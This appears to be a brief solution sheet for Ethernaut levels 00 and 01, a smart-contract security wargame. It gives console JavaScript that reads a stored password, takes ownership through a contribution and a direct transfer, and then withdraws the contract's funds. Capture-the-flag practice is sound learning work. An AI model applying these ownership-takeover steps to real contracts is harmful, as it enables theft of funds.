# Levels

## Level 00

https://ethernaut.openzeppelin.com/level/0xBA97454449c10a0F04297022646E7750b8954EE8

```Javascript
await contract.password()
await contract.authenticate("ethernaut0")
```

## Level 01

https://ethernaut.openzeppelin.com/level/0x80934BE6B8B872B364b470Ca30EaAd8AEAC4f63F

```javascript
await contract.owner() 
await contract.contributions("0x80934BE6B8B872B364b470Ca30EaAd8AEAC4f63F")
await contract.contribute.sendTransaction({from: player, value: toWei('0.0009')})

await sendTransaction({from: player, to: contract.address, value: toWei('0.0000000001')})
await contract.withdraw()
```